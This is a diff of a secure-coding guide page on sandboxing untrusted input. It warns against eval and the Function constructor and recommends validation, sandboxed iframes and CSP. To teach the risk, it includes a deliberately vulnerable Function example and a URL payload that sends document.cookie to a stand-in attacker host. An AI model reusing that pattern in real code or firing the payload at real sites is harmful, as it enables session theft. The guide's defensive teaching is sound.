@@ -1,54 +1,56 @@
 Sandboxing
 ==========
 
-Special on [Output Encoding][1] and [Database Security][2] sections you've been
-told that user input should be always handled as untrusted and unsafe data.
-Moreover user input data should never be subject of string concatenation to
+Especially in the [Output Encoding][1] and [Database Security][2] sections, you
+were told that user input should always be handled as untrusted and unsafe data.
+Moreover, user input data should never be subject of string concatenation to
 computed, for examples, database queries.
 
-You'll find more to General Coding Practices on [OWASP SCP - Quick Reference
+You'll find more General Coding Practices on [OWASP SCP - Quick Reference
 Guide][3] which we will address together:
 
 * "_Do not pass user supplied data to any dynamic execution function_"
 * "_Restrict users from generating new code or altering existing code_"
 
-Let's be brief: `eval` is evil (or at least it is when misunderstood)!
+Let's be brief - `eval` is evil (or at least, it is when misunderstood)!
 
-[`eval`][4] is a JavaScript function which, generally speaking, evaluates given
-argument (`String`) as source code, making it execute in the runtime context.
+[`eval`][4] is a JavaScript function which, generally speaking, that evaluates a
+given argument (`String`) as source code, allowing it to execute in the runtime
+context.
 
-This would be the same than dynamically add a new `<script>` HTML element to
+This would be the same as to dynamically adding a new `<script>` HTML element to
 the page's body.
 
-Note that evaluating arbitrary user input in your application's runtime context
+Note - evaluating arbitrary user input in your application's runtime context
 **SHOULD NEVER** be done.
 
-`eval` is not the only way to evaluate arbitrary `String`s: you may want to have
-a look at [Function constructor][5]. We go with a simple examples
+`eval` is not the only way to evaluate arbitrary `String`s, you may want to have
+a look at [Function constructor][5]. We'll go with the simple examples
 
 ```javascript
 const myAlert = Function('alert("' + document.location.hash.substring(1) + '")');
 myAlert();
 ```
 
-So, let's visit and "share sorrys"
+So, let's visit and "share sorrows"
 
 ```
 https://example.com/#sorry");(new Image).src="//attacker.com/?cookie="+document.cookie;("
 ```
 
-Rule of thumbs and further more that user input (as other data sources may cause
-you troubles): [identify and classify your data sources as "trusted" and
+Rule of thumb and furthermore, ensure that user input (as other data sources may
+cause you troubles): [identify and classify your data sources as "trusted" and
 "untrusted"][6] and **ALWAYS** (but **ALWAYS) perform [input validation][7],
 rejecting the invalid input.
 
-If after all you really need to execute untrusted data, please use a sandbox.
+If you really need to execute untrusted data, please use a sandbox.
 
-On the client-side the best you can do is loading the insecure content in a
-`<iframe>` HTML element with the attribute `sandbox` set. You can [find the specification
-here][8]. Whenever possible, provide a [Content Security Policy][9].
+On the client-side, the best you can do is load the insecure content in a
+`<iframe>` HTML element with the attribute `sandbox` set. You can [find the
+specification here][8]. Whenever possible, provide a [Content Security
+Policy][9].
 
-Server-side you have a few more options.
+On the server-side, you have a few more options.
 Have a look at these projects:
 
 * [gf3/sanbox][10]
